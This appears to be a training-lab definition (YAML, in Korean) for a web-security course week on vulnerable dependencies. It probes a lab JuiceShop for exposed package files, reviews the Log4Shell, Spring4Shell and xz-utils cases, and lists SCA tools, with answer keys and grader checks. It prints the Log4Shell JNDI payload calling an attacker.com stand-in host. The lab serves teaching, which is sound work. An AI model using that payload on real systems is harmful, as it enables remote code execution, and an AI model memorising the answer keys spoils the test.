@@ -1,0 +1,183 @@
+lab_id: standalone-web-vuln-week09
+title: A06 Vulnerable Components — npm audit + retire.js + dependency 분석
+version: standalone-non-ai
+course: web-vuln
+week: 9
+description: |
+  OWASP A06 — *외부 라이브러리* 의 *알려진 vuln 사용*. JuiceShop (Node.js) 의
+  npm audit + retire.js + dependency tree 분석. CVE matching.
+difficulty: medium
+duration_minutes: 150
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 MISSION — JuiceShop (Node.js) 의 dependency 분석 시도
+
+      JuiceShop 의 *package.json* 노출 가능 성 + dependency tree 추정.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      echo "=== JuiceShop /package.json 노출 ==="
+      curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/package.json
+      echo ""
+      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/package.json 2>&1 | head -20
+
+      echo ""
+      echo "=== /package-lock.json 노출 ==="
+      curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/package-lock.json
+      SH
+      ```
+
+      ## 📋 확인 사항
+      - package.json 의 *공개 응답* (200 = info leak / 404 = 정상)
+      - dependency list 추출 가능 여부
+    hint: package.json / package-lock.json 노출
+    category: survey
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' http://10.20.30.1/package.json
+      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/package.json 2>&1 | head -20
+      SH
+    answer_detail: package.json 노출 audit
+    verify:
+      type: output_contains
+      expect: '404\|200'
+      field: stdout
+      semantic:
+        intent: dependency 분석
+        success_criteria: [package.json audit]
+        acceptable_methods:
+          - "**[OSS] curl + package.json**"
+          - "**[OSS] retire.js scanner**"
+          - "**[OSS] npm audit (실 access 시)**"
+          - "**[OSS] CWE-1104 Use of Unmaintained Third Party Components**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: |
+      ## 🎯 MISSION — Log4Shell + Spring4Shell + xz-utils 사례 학습
+
+      *역대 최대 dependency vuln* 3 사례 분석.
+
+      ## 사례 1 — Log4Shell (CVE-2021-44228, 2021-12)
+      - Log4j 2.0-2.14 의 JNDI lookup
+      - payload: `${jndi:ldap://attacker.com/x}`
+      - 영향: *모든 Java app* (Apache / Solr / ElasticSearch)
+      - CVSS: 10.0 (Critical)
+
+      ## 사례 2 — Spring4Shell (CVE-2022-22965, 2022-03)
+      - Spring Framework 5.x 의 RCE
+      - 영향: Spring MVC app
+      - CVSS: 9.8
+
+      ## 사례 3 — xz-utils backdoor (CVE-2024-3094, 2024-03)
+      - Jia Tan 의 *2년 사회공학* → xz-utils 5.6.0-5.6.1 의 backdoor
+      - sshd 의 *pre-auth RCE 직전* 발견
+      - 영향: Debian / Fedora 의 *모든 sshd* (단 다행히 unstable 만)
+      - CVSS: 10.0
+
+      ## 학습 산출물
+      각 사례 의 *5 항목*: 발견 / payload / 영향 / CVSS / 정정.
+    hint: 3 사례 의 5 항목 학습
+    category: analysis
+    points: 25
+    answer: |
+      cat <<'EOF'
+      Log4Shell: JNDI lookup ${jndi:ldap://...} + 모든 Java app + 10.0
+      Spring4Shell: Spring MVC RCE + 9.8
+      xz-utils: Jia Tan 2년 + sshd pre-auth + 10.0
+      EOF
+    answer_detail: 3 dependency vuln 사례
+    verify:
+      type: output_contains
+      expect: 'Log4Shell\|jndi\|xz'
+      field: stdout
+      semantic:
+        intent: dependency 사례
+        success_criteria: [3 사례 + 5 항목]
+        acceptable_methods:
+          - "**[OSS] Log4Shell + Spring4Shell + xz-utils**"
+          - "**[OSS] CVE matching tool**"
+          - "**[OSS] dependency 의 *수기* audit**"
+    target_vm: bastion
+
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION — SCA (Software Composition Analysis) 도구 매트릭스
+
+      modern dependency audit 의 *5 도구* 매핑.
+
+      ## 도구 비교
+      | 도구 | 언어 | 특징 |
+      |------|------|------|
+      | npm audit | Node.js | npm 의 *내장* |
+      | yarn audit | Node.js | yarn 의 *내장* |
+      | pip-audit | Python | PyPI 의 vuln |
+      | Snyk | 다언어 | 상용 + free tier |
+      | Dependabot | GitHub | 자동 PR |
+      | retire.js | JavaScript (client) | 브라우저 의 *오래된 lib* |
+      | OWASP Dependency-Check | Java | NVD 기반 |
+    hint: SCA 도구 5 종
+    category: analysis
+    points: 25
+    answer: |
+      cat <<'EOF'
+      npm audit / yarn audit (Node)
+      pip-audit (Python)
+      Snyk / Dependabot (다언어)
+      retire.js (client JS)
+      OWASP Dependency-Check (Java)
+      EOF
+    answer_detail: SCA 도구 매트릭스
+    verify:
+      type: output_contains
+      expect: 'npm\|Snyk\|retire'
+      field: stdout
+      semantic:
+        intent: SCA 도구
+        success_criteria: [5 도구]
+        acceptable_methods:
+          - "**[OSS] npm audit fix --force**"
+          - "**[OSS] Snyk monitor**"
+          - "**[OSS] Dependabot 자동 PR**"
+          - "**[OSS] SBOM (CycloneDX / SPDX)**"
+    target_vm: bastion
+
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION — W09 보고서 + 매핑
+
+      ## 산출물
+      ```markdown
+      # W09 — A06 Vulnerable Components
+
+      ## 1. JuiceShop dependency audit 결과
+      ## 2. 3 사례 (Log4Shell / Spring4Shell / xz-utils)
+      ## 3. SCA 5 도구 추천
+      ## 4. CVE matching workflow
+
+      ## 매핑
+      | F | CVSS | CWE |
+      | F1 dependency 미audit | 7.5 (H) | CWE-1104 |
+      ```
+    hint: 4 섹션 + CWE-1104
+    category: synthesis
+    points: 25
+    answer: 위 형식
+    answer_detail: W09 보고서
+    verify:
+      type: output_contains
+      expect: 'CWE-1104\|dependency'
+      field: stdout
+      semantic:
+        intent: W09 종합
+        success_criteria: [4 섹션]
+        acceptable_methods: ["**[관리적] PTES + SCA + SBOM**"]
+    target_vm: bastion
